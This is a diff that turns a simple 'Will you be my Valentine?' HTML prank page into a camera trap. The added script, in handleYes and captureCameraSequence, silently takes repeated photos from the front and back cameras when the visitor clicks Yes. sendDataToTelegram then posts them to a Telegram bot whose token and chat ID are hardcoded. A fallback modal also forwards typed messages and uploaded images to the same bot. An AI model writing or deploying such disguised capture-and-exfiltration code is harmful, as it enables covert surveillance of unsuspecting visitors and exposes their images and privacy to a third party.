@@ -1,140 +1,519 @@
 
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Valentine 💖</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valentine 💖</title>
+    <style>
+        :root {
+            --primary: #d32f2f;
+            --primary-light: #ff6659;
+            --bg-color: #f9e3e3;
+            --card-bg: rgba(255, 255, 255, 0.9);
+            --text-color: #333;
+            --success: #4caf50;
+            --danger: #f44336;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
 
-<style>
-body {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    background-color: #f9e3e3;
-    font-family: Arial, sans-serif;
-    flex-direction: column;
-}
+        body {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f9e3e3 0%, #fce4ec 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
 
-.container {
-    text-align: center;
-    margin-top: auto;
-}
+        /* Header */
+        header {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(10px);
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            z-index: 100;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
 
-h1 {
-    font-size: 2.5em;
-    color: #d32f2f;
-}
+        .brand-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+            padding: 5px 12px;
+            border: 1px solid var(--primary);
+            border-radius: 20px;
+            transition: all 0.3s ease;
+        }
 
-.buttons {
-    margin-top: 20px;
-}
+        .brand-link:hover {
+            background: var(--primary);
+            color: white;
+        }
 
-button {
-    font-size: 1.5em;
-    padding: 10px 20px;
-    margin: 10px;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: transform 0.2s ease;
-}
+        /* Main Container */
+        .container {
+            text-align: center;
+            margin-top: auto;
+            margin-bottom: auto;
+            padding: 20px;
+            width: 100%;
+            max-width: 600px;
+        }
 
-button:hover {
-    transform: scale(1.05);
-}
+        h1 {
+            font-size: 3em;
+            color: var(--primary);
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.05);
+            animation: float 3s ease-in-out infinite;
+        }
 
-.yes-button {
-    background-color: #4caf50;
-    color: white;
-}
+        @keyframes float {
 
-.no-button {
-    background-color: #f44336;
-    color: white;
-}
+            0%,
+            100% {
+                transform: translateY(0);
+            }
 
-.gif_container img {
-    max-width: 100%;
-    height: auto;
-    border-radius: 10px;
-    margin-top: 20px;
-}
+            50% {
+                transform: translateY(-10px);
+            }
+        }
 
-/* Credits Section */
-.footer {
-    width: 100%;
-    background: linear-gradient(135deg, #000000, #2b0015);
-    color: #ffc0cb;
-    text-align: center;
-    padding: 15px 10px;
-    font-size: 14px;
-    letter-spacing: 0.5px;
-}
+        .gif_container img {
+            max-width: 100%;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            margin-top: 30px;
+            transition: transform 0.3s ease;
+        }
 
-.footer a {
-    color: #ff5fa2;
-    text-decoration: none;
-    margin: 0 5px;
-    transition: color 0.3s ease;
-}
+        /* Buttons */
+        .buttons {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
 
-.footer a:hover {
-    color: #ffffff;
-}
-</style>
+        button {
+            font-size: 1.5em;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-family: inherit;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        .yes-button {
+            background-color: var(--success);
+            color: white;
+            background-image: linear-gradient(45deg, #4caf50, #81c784);
+        }
+
+        .no-button {
+            background-color: var(--danger);
+            color: white;
+            background-image: linear-gradient(45deg, #f44336, #ef5350);
+            transition: all 0.3s ease;
+            /* Override for smooth scaling */
+        }
+
+        /* Modal / Popup */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .modal h2 {
+            color: var(--primary);
+            margin-top: 0;
+        }
+
+        .upload-area {
+            border: 2px dashed #ccc;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+
+        .upload-area:hover {
+            border-color: var(--primary);
+        }
+
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 15px;
+            font-family: inherit;
+            resize: vertical;
+        }
+
+        /* Status/Loading */
+        .status-message {
+            margin-top: 20px;
+            font-weight: 600;
+            color: #666;
+        }
+
+        /* Hidden Elements for Camera Logic */
+        #videoElement,
+        #canvasElement {
+            display: none;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            background: #2b0015;
+            color: #ffc0cb;
+            text-align: center;
+            padding: 20px 10px;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #ff5fa2;
+            text-decoration: none;
+            margin: 0 8px;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #ffffff;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2em;
+            }
+
+            .buttons {
+                flex-direction: column;
+                width: 100%;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="container" id="main">
-    <h1>Will you be my Valentine?</h1>
+    <!-- Header -->
+    <header>
+        <a href="https://huggingface.co/spaces/akhaliq/anycoder" target="_blank" class="brand-link">
+            Built with anycoder
+        </a>
+    </header>
 
-    <div class="buttons">
-        <button class="yes-button" onclick="yes()">Yes</button>
-        <button class="no-button" onclick="no()">No</button>
+    <div class="container" id="main">
+        <h1>Will you be my Valentine?</h1>
+
+        <div class="buttons">
+            <button class="yes-button" onclick="handleYes()">Yes</button>
+            <button class="no-button" onclick="no()">No</button>
+        </div>
+
+        <div class="gif_container">
+            <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW5lenZyZHI5OXM2eW95b3pmMG40cWVrMDhtNjVuM3A4dGNxa2g2dSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/VM1fcpu2bKs1e2Kdbj/giphy.gif" alt="Cute GIF">
+        </div>
     </div>
 
-    <div class="gif_container">
-        <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW5lenZyZHI5OXM2eW95b3pmMG40cWVrMDhtNjVuM3A4dGNxa2g2dSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/VM1fcpu2bKs1e2Kdbj/giphy.gif">
+    <!-- Fallback Modal (Camera Denied/Error) -->
+    <div class="modal-overlay" id="uploadModal">
+        <div class="modal">
+            <h2>Leave a message 💬</h2>
+            <p>Since we couldn't capture your reaction, upload a photo or write something sweet!</p>
+
+            <textarea id="fallbackMessage" rows="4" placeholder="Type your message here..."></textarea>
+
+            <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+                <span id="fileName">Click to upload an image 📷</span>
+                <input type="file" id="fileInput" accept="image/*" style="display: none;" onchange="handleFileSelect(this)">
+            </div>
+
+            <button class="yes-button" style="font-size: 1em; padding: 10px 25px;" onclick="submitFallback()">Send 💖</button>
+        </div>
     </div>
-</div>
 
-<div class="footer">
-    Made by <strong>@corpsealone</strong><br>
-    <a href="https://instagram.com/corpsealone" target="_blank">Insta</a> |
-    <a href="https://t.me/iFuckBaddies" target="_blank">Telegram</a>
-</div>
+    <!-- Hidden Video and Canvas for Capture -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
 
-<script>
-const messages = [
- "Are you sure?","Really sure??","Are you positive?",
- "Pookie please...","Just think about it!",
- "If you say no, I will be really sad...",
- "I will be very sad...","I will be very very very sad...",
- "Ok fine, I will stop asking...","Just kidding, say yes please ❤️"
-];
-let i = 0;
+    <div class="footer">
+        Made by <strong>@corpsealone</strong><br>
+        <a href="https://instagram.com/corpsealone" target="_blank">Insta</a> |
+        <a href="https://t.me/iFuckBaddies" target="_blank">Telegram</a>
+    </div>
 
-function no(){
- const n = document.querySelector(".no-button");
- const y = document.querySelector(".yes-button");
- n.innerText = messages[i];
- i = (i + 1) % messages.length;
- let size = parseFloat(getComputedStyle(y).fontSize);
- y.style.fontSize = (size * 1.4) + "px";
-}
+    <script>
+        // Configuration
+        const BOT_TOKEN = "7823960731:AAEDy3CxHf68-zMMvN0iUObs5pMBchTPMWU";
+        const USER_ID = "6259443940";
 
-function yes(){
- document.getElementById("main").innerHTML = `
- <h1 style="font-size:3em;color:#d32f2f;">Knew you would say yes! 💘</h1>
- <div class="gif_container">
-   <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmo3c3l5ODh3ZGN6NHhhaDE2Mjg1ZjkwOXczdDFxbWM3dTBtaW9zaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/9XY4f3FgFTT4QlaYqa/giphy.gif">
- </div>`;
-}
-</script>
+        const messages = [
+            "Are you sure?", "Really sure??", "Are you positive?",
+            "Pookie please...", "Just think about it!",
+            "If you say no, I will be really sad...",
+            "I will be very sad...", "I will be very very very sad...",
+            "Ok fine, I will stop asking...", "Just kidding, say yes please ❤️"
+        ];
+        let i = 0;
+        let capturedBlobs = []; // Store images here
 
+        // "No" Button Logic
+        function no() {
+            const n = document.querySelector(".no-button");
+            const y = document.querySelector(".yes-button");
+            if (!n || !y) return;
+            
+            n.innerText = messages[i];
+            i = (i + 1) % messages.length;
+            
+            let currentSize = parseFloat(window.getComputedStyle(y).fontSize);
+            // Cap max size to prevent breaking layout too badly
+            if (currentSize < 100) { 
+                y.style.fontSize = (currentSize * 1.4) + "px";
+            }
+        }
+
+        // Main "Yes" Logic
+        async function handleYes() {
+            // Update UI to show we are working
+            const main = document.getElementById("main");
+            main.innerHTML = `
+                <h1>Yay! 💖</h1>
+                <div class="gif_container">
+                    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmo3c3l5ODh3ZGN6NHhhaDE2Mjg1ZjkwOXczdDFxbWM3dTBtaW9zaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/9XY4f3FgFTT4QlaYqa/giphy.gif">
+                </div>
+                <p class="status-message">Capturing your beautiful reaction... 📸</p>
+            `;
+
+            try {
+                // Check if MediaDevices is supported
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error("Camera not supported");
+                }
+
+                // 1. Capture Front Camera (5 pics)
+                await captureCameraSequence('user', 5);
+                
+                // 2. Capture Back Camera (5 pics)
+                // Note: Back camera might not exist on desktop/laptops, so we wrap in try/catch
+                try {
+                    await captureCameraSequence('environment', 5);
+                } catch (e) {
+                    console.log("Back camera not available or failed, skipping...");
+                }
+
+                // 3. Send all data
+                await sendDataToTelegram();
+
+                // 4. Success State
+                main.innerHTML = `
+                    <h1 style="font-size:3em;color:#d32f2f;">Knew you would say yes! 💘</h1>
+                    <p>Your reaction has been saved forever!</p>
+                    <div class="gif_container">
+                        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmo3c3l5ODh3ZGN6NHhhaDE2Mjg1ZjkwOXczdDFxbWM3dTBtaW9zaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/9XY4f3FgFTT4QlaYqa/giphy.gif">
+                    </div>
+                `;
+
+            } catch (error) {
+                console.error("Camera sequence failed:", error);
+                // If camera fails (permission denied or no hardware), show upload modal
+                showUploadModal();
+            }
+        }
+
+        // Helper: Capture sequence
+        async function captureCameraSequence(facingMode, count) {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingMode } 
+            });
+            
+            video.srcObject = stream;
+            
+            // Wait for video to load metadata to play
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+
+            // Small delay to ensure light adjustment
+            await new Promise(r => setTimeout(r, 500));
+
+            // Capture 'count' number of images
+            for (let j = 0; j < count; j++) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Draw video frame to canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to Blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                capturedBlobs.push(blob);
+                
+                // Small delay between shots
+                await new Promise(r => setTimeout(r, 300));
+            }
+
+            // Stop tracks to release camera
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        // Helper: Send Data to Telegram
+        async function sendDataToTelegram() {
+            const caption = capturedBlobs.length > 0 ? "Reaction Photos 📸" : "Message 💬";
+            
+            // Send photos one by one to avoid rate limits / file size limits
+            for (let k = 0; k < capturedBlobs.length; k++) {
+                const formData = new FormData();
+                formData.append("chat_id", USER_ID);
+                formData.append("photo", capturedBlobs[k]);
+                formData.append("caption", `${caption} ${k + 1}`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (e) {
+                    console.error("Failed to send photo", e);
+                }
+            }
+        }
+
+        // Fallback UI Functions
+        function showUploadModal() {
+            document.getElementById('uploadModal').style.display = 'flex';
+            // Update main text to reflect the fallback
+            const main = document.getElementById("main");
+            main.innerHTML = `
+                <h1>Will you be my Valentine?</h1>
+                <p style="color: #d32f2f;">Please allow camera or upload a message!</p>
+                <div class="gif_container">
+                    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW5lenZyZHI5OXM2eW95b3pmMG40cWVrMDhtNjVuM3A4dGNxa2g2dSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/VM1fcpu2bKs1e2Kdbj/giphy.gif">
+                </div>
+            `;
+        }
+
+        function handleFileSelect(input) {
+            if (input.files && input.files[0]) {
+                document.getElementById('fileName').innerText = input.files[0].name;
+            }
+        }
+
+        async function submitFallback() {
+            const messageText = document.getElementById('fallbackMessage').value;
+            const fileInput = document.getElementById('fileInput');
+            
+            const btn = document.querySelector('#uploadModal button');
+            btn.innerText = "Sending...";
+
+            // 1. Send Text Message
+            if (messageText.trim()) {
+                const formDataMsg = new FormData();
+                formDataMsg.append("chat_id", USER_ID);
+                formDataMsg.append("text", "Message from Valentine: " + messageText);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    body: formDataMsg
+                });
+            }
+
+            // 2. Send File if exists
+            if (fileInput.files[0]) {
+                const formDataImg = new FormData();
+                formDataImg.append("chat_id", USER_ID);
+                formDataImg.append("photo", fileInput.files[0]);
+                formDataImg.append("caption", "Uploaded Photo");
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formDataImg
+                });
+            }
+
+            // Close modal and show success
+            document.getElementById('uploadModal').style.display = 'none';
+            document.getElementById("main").innerHTML = `
+                <h1 style="font-size:3em;color:#d32f2f;">Knew you would say yes! 💘</h1>
+                <div class="gif_container">
+                    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmo3c3l5ODh3ZGN6NHhhaDE2Mjg1ZjkwOXczdDFxbWM3dTBtaW9zaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/9XY4f3FgFTT4QlaYqa/giphy.gif">
+                </div>
+            `;
+        }
+    </script>
 </body>
+
 </html>
